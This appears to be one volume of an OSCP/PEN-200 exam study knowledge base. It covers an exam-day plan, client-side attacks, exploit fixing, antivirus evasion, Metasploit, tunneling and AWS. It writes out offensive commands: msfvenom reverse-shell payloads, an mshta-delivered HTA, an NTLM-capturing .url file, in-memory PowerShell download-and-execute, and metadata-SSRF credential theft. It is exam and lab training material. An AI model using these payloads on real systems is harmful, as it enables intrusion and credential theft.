**Then just do boxes** (Proving Grounds Practice, HTB TJ-Null OSCP-like list, OffSec Challenge Labs), taking notes as if reporting. Target ~40–60 boxes, AD-weighted. Read a writeup only *after* you try — the gap between your notes and the writeup is your study list.

---

# [EXAM-DAY-FLOW]  ⭐ the master wrapper (open this first on exam day)

**One-line model:** *Scan everything → AD set first (BloodHound + roasts + spray → path to DC) → standalones on the 30-min rotation → spray every cred everywhere → screenshot proof the instant you get it → stop early to lock down proofs → write the report.*

> ⚠️ **No Buffer Overflow box exists in OSCP+.** Old guides say "start with the 25-pt BOF" — ignore that. Center of gravity = the **AD set (40 pts, all-or-nothing)**.

### PHASE 0 — Setup (day before + first 10 min)
- Day before: test VPN/VM/screenshots/notes; pin `OSCP-KB.html`; pre-make folders:
  `mkdir -p ~/oscp/{AD1,AD2,AD3,ST-A,ST-B,ST-C}/{scans,loot,exploits,www}`
- Start a terminal logger for the report: `script -q ~/oscp/session-$(date +%F).log`
- First 10 min (clock running): connect proctor+VPN, confirm target reachability, **read the control-panel brief** (starting creds, hostnames, domain, which are AD vs standalone) → paste into notes. Open `[MASTER-METHODOLOGY]` + `[TIME-MANAGEMENT]`.

### PHASE 1 — Fire all scans in parallel (first ~20–30 min) → `[NMAP-QUICK]`
- Launch `nmap -p- --min-rate 2000 -Pn` on **every** target at once (separate tabs). Then `-sCV` on the ports that return. Backgrounded `-sU --top-ports 100` on each.
- While scans run, start web enum on any host already showing 80/443. Route each open port via `[ENUM-DECISION]`.
- Rule: **enumerate all ports + all web before exploiting anything.**

### PHASE 2 — AD set FIRST (fresh brain, ~hrs 0.5–8) → `[AD-QUICK]`, `[AD-ATTACK-PATH]`
1. Foothold the entry host (web/service/provided cred) → stabilize (`[SHELL-QUICK]`).
2. Local loot (`[CREDENTIALS-SOURCES]`, `[WINDOWS-PRIVESC-QUICK]`).
3. First domain cred → `sudo ntpdate $DC` → **BloodHound** (`[AD-BLOODHOUND]`) → **Kerberoast** (`[AD-KERBEROAST]`) + **AS-REP** (`[AD-ASREP]`) → **spray everywhere** (`[CREDENTIALS-QUICK]`).
4. Follow BloodHound's shortest path: crack roast / abuse ACL (`[AD-ACL]`) → lateral (`[AD-LATERAL]`) → dump creds on each host → repeat.
5. Own DC → `[AD-DCSYNC]` (`secretsdump`) → PtH Administrator to DC + member + workstation → read all `proof.txt`.
- Decision: AD dead-stalled at ~3–4h with zero progress → bank a standalone, return fresh.

### PHASE 3 — Standalones, rotate (~hrs 8–16) → `[MASTER-METHODOLOGY]`
Per box: service triage (`[ENUM-DECISION]`) → foothold (`[FOOTHOLD-CHECKLIST]`) → **screenshot `local.txt` now** → privesc (`[LINUX-PRIVESC-QUICK]`/`[WINDOWS-PRIVESC-QUICK]`) → **screenshot `proof.txt` now**.
- **15-min rule:** stuck → re-read scan output. **30-min rule:** no new hypothesis → switch box, note where you stopped. New cred → spray on all boxes.
- Stuck → `[STUCK-PROTOCOL]`. Broken → `[TROUBLESHOOTING-QUICK]`. Weird box → revert (free).

### PHASE 4 — Sleep + mop-up (~hrs 10–20)
Sleep ~4–6h (fatigue = tunnel vision). Then re-attack stuck boxes fresh, grab remaining low-priv 10-pointers.
- Passing math: AD 40 + two full standalones 40 = 80 ✅. Or AD 40 + one full 20 + two low-priv 20 = 80 ✅.

### PHASE 5 — Proof lockdown (STOP hacking ~hrs 20–23) → `[REPORTING-CHECKLIST]`
Every owned host: one screenshot with **flag + `whoami`/`id` + `ip a`/`ipconfig`**. Re-take any missing **now**. Enter every flag in the control panel.

### PHASE 6 — Report (next 24h) → `[REPORTING]`
Per host reproducible steps + screenshots + proof. AD: show the full chain + cred flow. Upload in OffSec's format before deadline. **No report = no pass.**

---

# [CLIENTSIDE] Client-Side Attacks & [PHISHING] Phishing  (Modules 11–12)
**EXAM RELEVANCE:** ⚠️ *Low–moderate.* The exam usually gives you a starting foothold rather than requiring you to phish a live human. **Recognize these; don't over-drill.** Some AD entry hosts simulate a user who "opens" a file — that's where these matter. `[GENERAL]`

## [CLIENTSIDE-CONCEPT]
Client-side = you deliver a file/link and a **user action** triggers code on *their* machine (not a server exploit). PEN-200 focuses on: **capturing NTLM hashes**, **malicious Office macros**, **HTA applications**, and **Windows Library + WebDAV**.

## [CLIENTSIDE-NTLM-CAPTURE]  (highest value — feeds AD roasting/relay)
Make a victim's machine authenticate to **you**, capture the NetNTLMv2 hash → crack or relay.
> ⛔ **EXAM CAVEAT (`[EXAM-RULES-2026]`):** Responder **poisoning** (LLMNR/NBNS/WPAD, the `-w` flag) is **BANNED**. On the exam use **analyze mode** (`responder -A -I tun0`) or just host an SMB server (`impacket-smbserver`) — capturing a hash because a file the victim opens authenticates *to your server* is allowed; actively poisoning name resolution is not.
```
# Start a capture server on Kali (LAB/practice — see exam caveat above):
sudo responder -I tun0                       # listens LLMNR/NBNS/SMB/HTTP (poisoning = lab only)
sudo responder -A -I tun0                     # ANALYZE mode (passive) = exam-compliant
# Deliver a file/link that forces an SMB/WebDAV auth to your IP, e.g.:
#  - a share/upload with a malicious .scf / .url / .lnk pointing to \\$IP\x
#  - an email/web link:  file://$IP/x   or   \\$IP\share
# Captured hash → crack:
hashcat -m 5600 netntlmv2.txt rockyou.txt
```
`.url` example dropped in a writable share (target browses the folder → auth to you):
```
[InternetShortcut]
URL=file://$IP/x
IconIndex=1
IconFile=\\$IP\x\icon.ico
```
**LEADS TO:** NetNTLMv2 → crack → domain creds; or **NTLM relay** (`ntlmrelayx` to a signing:False host) → command exec. See `[SMB-ATTACK]`, `[AD-CREDENTIALS]`.

## [CLIENTSIDE-MACRO]  malicious Office macro (VBA)
When a target is expected to open a document (rare on exam):
```
# msfvenom can generate VBA:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f vba
```
Paste into the document's VBA editor (Auto_Open/Document_Open sub). A common OSCP-style VBA drops+runs a payload via PowerShell. Host payload with `python3 -m http.server`; catch with a listener.

## [CLIENTSIDE-HTA]  HTML Application
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f hta-psh -o evil.hta
# victim runs:  mshta http://$IP/evil.hta
```

## [CLIENTSIDE-LIBRARY-WEBDAV]  Windows Library + WebDAV (PEN-200 technique)
Host a WebDAV share (`wsgidav`/`impacket`), craft a `.Library-ms` + shortcut that points at your WebDAV, deliver it; when opened it lists your share and runs your payload. `[LOOK-UP]` (uncommon on exam — recognize only).
**TROUBLESHOOT:** payload caught by AV → see `[AV-EVASION]`; hash not cracking → try relay instead.

---

# [FIXING-EXPLOITS]  (Module 14 — expands `[EXPLOIT-RESEARCH]`)
**EXAM RELEVANCE:** ✅ *Moderate–high.* You WILL need to compile/patch a public exploit. `[GENERAL]`

## [FIXING-COMPILE]  compiling exploits
```
# Linux C exploit:
gcc exploit.c -o exploit                 # add -m32 for 32-bit, -static if libc mismatch
# Windows exe from Kali (cross-compile with mingw):
sudo apt install -y mingw-w64                           # if the compilers below are missing (usually preinstalled)
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe        # 64-bit
i686-w64-mingw32-gcc  exploit.c -o exploit.exe         # 32-bit
# 32-bit LINUX exploit on 64-bit Kali needs multilib:  sudo apt install gcc-multilib  →  gcc -m32 exploit.c -o exploit
# Windows privesc PoCs often need Visual Studio — check for a precompiled release on the repo first.
```

## [FIXING-PYTHON]  Python 2 → 3 breakage
- `print x` → `print(x)`. `urllib2` → `urllib.request`. `socket.send("x")` → `.send(b"x")` (bytes).
- Run with the intended interpreter: `python2 exploit.py` (install if needed) vs `python3`.

## [FIXING-BADCHARS-SHELLCODE]  patch the payload
- **Bad characters:** many exploits mangle if shellcode contains `\x00 \x0a \x0d` etc. Regenerate excluding them:
  `msfvenom -p ... -b '\x00\x0a\x0d' -f c LHOST=$IP LPORT=443`
- **Replace hardcoded values:** set the exploit's `LHOST`/`LPORT`/`RHOST`, target IP, and any offset/return address to match your case.
- **Regenerate embedded shellcode:** produce new shellcode with msfvenom in the format the PoC expects (`-f python/c/ps1`), paste it in, keep the variable name/length assumptions consistent.
- **Architecture:** x86 vs x64 must match the target process.

## [FIXING-CHECKLIST]  before you run anything
```
[ ] Read the whole exploit — what does it do? Any destructive/DoS action? (revert risk)
[ ] Version + arch + auth requirement match the target exactly?
[ ] LHOST=tun0 IP, LPORT set, target IP/port correct
[ ] Interpreter/deps present (python2? ruby? gcc/mingw?)
[ ] Shellcode has no bad chars; regenerated for your listener
[ ] Not malware masquerading as a PoC (unknown network calls = suspicious)
```

---

# [AV-EVASION]  Antivirus Evasion  (Module 15)
**EXAM RELEVANCE:** ⚠️ *Low for standard OSCP+ targets* (most exam boxes don't run hardened Defender that eats everything), but **Defender is sometimes on**, so know the basics. **Do not build a study plan around AV evasion.** `[GENERAL]`

## [AV-CONCEPT]
Signature + heuristic + AMSI (script scanning) can flag your payloads. Options, cheapest first:
1. **Use a different technique** — a living-off-the-land command, a webshell, or creds+`evil-winrm` avoids dropping a flagged binary entirely.
2. **Don't touch disk** — run PowerShell/C# **in memory** (download-and-exec, reflective load).
3. **Obfuscate / re-encode** the payload.
4. **Compile your own** loader (custom C#/C shellcode runner) — most reliable vs signatures.

## [AV-PRACTICAL]
- **msfvenom encoders are NOT AV evasion** anymore (e.g., `shikata_ga_nai` is well-signatured). Don't rely on `-e`/`-i`.
- **AMSI bypass** (PowerShell script blocked): use a known AMSI-bypass one-liner before your script `[LOOK-UP]`, or run via a non-PowerShell vector. Patch/obfuscate approaches exist — verify current bypass, they change.
- **In-memory PS download-exec:** `IEX (New-Object Net.WebClient).DownloadString('http://$IP/x.ps1')` (may still hit AMSI → bypass first).
- **Custom C# shellcode runner** (compile with `csc.exe` / mono) that allocates memory + runs msfvenom raw shellcode — evades static sigs far better than a raw msfvenom exe.
- **Tools:** Invoke-Obfuscation (PS), Shellter (PE injection), Veil (dated), custom loaders. `[LOOK-UP]`
**TROUBLESHOOT:** payload deletes instantly → Defender real-time; try in-memory + obfuscation, or avoid the binary (use creds/webshell). Test detection with `AMSITrigger`/local Defender if available (don't upload to VirusTotal — it distributes samples).

---

# [TOOL-MSF]  The Metasploit Framework  (Module 21)
**EXAM RELEVANCE:** ✅ but **restricted — ONE target only.** Meterpreter/exploit/post modules count against your single allowed machine; **no MSF for pivoting.** Use it deliberately on your hardest box; **do everything else manually.** `[OFFICIAL OFFSEC]`

## [MSF-QUICK]
```
msfconsole -q
search <product/cve>
use exploit/<path>
show options ; set RHOSTS $T ; set LHOST tun0 ; set LPORT 443 ; set RPORT <p>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit            # or: run
sessions -l ; sessions -i 1 ; background       # (Ctrl+Z to background a session)
```
## [MSF-HANDLER]  catch a manual payload (multi/handler)
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0 ; set LPORT 443 ; exploit -j
```
## [MSF-MSFVENOM]  payload generation (usable broadly for shells)
```
# Windows exe / Linux elf / web / raw shellcode:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f exe -o m.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf -o r.elf
msfvenom -p php/reverse_php LHOST=$IP LPORT=443 -f raw -o sh.php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o r.exe   # non-meterpreter stager (no MSF session needed to catch — use nc)
```
## [MSF-METERPRETER]  common commands
`getuid`, `sysinfo`, `ps`, `migrate <pid>`, `hashdump`, `getsystem` (token), `upload/download`, `shell`, `background`, `run post/multi/recon/local_exploit_suggester` (privesc leads).
**RULE:** pick your ONE MSF box (often the hardest/most finicky exploit). Everywhere else: manual exploit + `nc`/manual shells (`[SHELL-QUICK]`). Never MSF-pivot on the exam.

---

# [DPI-TUNNELING]  Tunneling Through Deep Packet Inspection  (Module 20 — extends `[PIVOT-*]`)
**EXAM RELEVANCE:** ⚠️ *Low–moderate.* Standard pivoting (`[PIVOT-QUICK]` Ligolo/Chisel/SSH) covers almost everything. This is for when normal ports/protocols are **filtered by a firewall/proxy**. `[GENERAL]`
- **Chisel over HTTP/TLS**: chisel already looks like HTTP(S); use common egress ports (80/443) if raw ports are blocked.
- **DNS tunneling (dnscat2 / iodine):** when *only* DNS (53) leaves the network. Slow, last resort.
  `# server: dnscat2-server tunnel.domain ; client: ./dnscat2 tunnel.domain` `[LOOK-UP]`
- **SSH over 443 / proxy:** if only 443 egress → run SSH/chisel on 443; behind an HTTP proxy use `proxytunnel`/`corkscrew`.
- **Decision:** try Ligolo/Chisel on 443 first; only reach for DNS tunneling if everything else is filtered.

---

# [CLOUD-AWS]  AWS Cloud (Modules 25–26, 29–31)
**EXAM RELEVANCE:** 🚫 **NOT on the standard OSCP/OSCP+ exam.** The exam is 3 standalones + 1 AD set. Cloud is **course/"Extra Mile" content only** — good general knowledge, but **do not spend exam prep here.** Skim it, move on. `[OFFICIAL OFFSEC]` (exam guide format) + `[COMMUNITY]`

## [CLOUD-AWS-QUICK]  (awareness level)
```
aws configure                              # set found access key/secret/region
aws sts get-caller-identity                # who am I (identity/account)
aws s3 ls ; aws s3 ls s3://<bucket> --no-sign-request     # public bucket loot
aws iam list-users ; aws iam list-attached-user-policies --user-name X
aws ec2 describe-instances                 # find hosts/user-data (may hold secrets)
aws secretsmanager list-secrets ; aws ssm get-parameters ...
```
- **Metadata SSRF (this CAN appear via a web `[WEB-SSRF]` finding):** `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → temporary AWS creds. This overlaps normal web exploitation — worth recognizing.
- Loot to hunt: S3 buckets (public/misconfigured), IAM over-permissive policies, EC2 user-data scripts, Secrets Manager/SSM parameters.
**Bottom line for a beginner:** learn the metadata-SSRF idea (it's a web trick); skip deep AWS attack chains until after you pass.

---

# [SYLLABUS-MAP]  PEN-200 module → KB coverage (full)
```
1-6  Intro/Kali/CLI/Bash/Report/Info-Gathering → [BEGINNER-START-HERE], Vol1 [ENUM-*], Vol0 [REPORTING]
7    Vulnerability Scanning        → [NMAP-SCRIPTS] [METHOD-7] (nikto); Nessus not needed for exam
8    Intro Web App Attacks         → Vol2 [WEB-QUICK] [WEB-FINGERPRINT] [WEB-CONTENT]
9    Common Web App Attacks        → Vol2 [WEB-*] (LFI/RFI/CMDINJ/SSRF/SSTI/XXE/UPLOAD/IDOR/JWT/AUTHBYPASS)
10   SQL Injection Attacks         → Vol2 [SQLI-*] (mini-course, all DBs + sqlmap)
11   Phishing Basics               → Vol7 [PHISHING] [CLIENTSIDE-NTLM-CAPTURE]
12   Client-side Attacks           → Vol7 [CLIENTSIDE-*] (NTLM capture / macro / HTA / library)
13   Locating Public Exploits      → Vol3 [EXPLOIT-RESEARCH]
14   Fixing Exploits               → Vol7 [FIXING-EXPLOITS] (+ Vol3 [EXPLOIT-RESEARCH])
15   Antivirus Evasion             → Vol7 [AV-EVASION]
16   Password Attacks              → Vol3 [CREDENTIALS-*] [HASH-IDENTIFICATION] (hydra/hashcat/john)
17   Windows Privilege Escalation  → Vol4 [WINDOWS-PRIVESC-*]
18   Linux Privilege Escalation    → Vol4 [LINUX-PRIVESC-*]
19   Port Redirection & SSH Tunnel → Vol5 [PIVOT-SSH] [PIVOT-QUICK]
20   Tunneling Through DPI         → Vol7 [DPI-TUNNELING] (+ Vol5 [PIVOT-*])
21   The Metasploit Framework      → Vol7 [TOOL-MSF] (one-target rule)
22   AD Introduction & Enumeration → Vol5 [AD-ENUM] [AD-QUICK] [AD-BLOODHOUND]
23   Attacking AD Authentication   → Vol5 [AD-KERBEROAST] [AD-ASREP] [AD-CREDENTIALS]
24   Lateral Movement in AD        → Vol5 [AD-LATERAL] [AD-ACL] [AD-DCSYNC]
25-26 AWS Cloud Enum/Attack        → Vol7 [CLOUD-AWS]  (NOT on exam — awareness only)
27   Assembling the Pieces         → Vol5 [AD-ATTACK-PATH], Vol6 [CHAIN-*], Vol7 [EXAM-DAY-FLOW]
28   Trying Harder: Challenge Labs → Vol0 [MINIMUM-VIABLE-PREP], [BEGINNER-START-HERE]
29-31 Extra Mile: Cloud Labs       → Vol7 [CLOUD-AWS] (NOT on exam)
```
**Everything in the syllabus is now covered.** Exam-critical (spend your time here): **8–10 (web/SQLi), 13–14 & 16 (exploits/passwords), 17–19 (privesc/pivot), 22–24 (AD), 27 (assembling).** Light-touch: 11–12, 15, 20, 21. Skip-for-exam: 25–26, 29–31 (cloud).

---
*End Volume 7. This completes the PEN-200 syllabus coverage.*
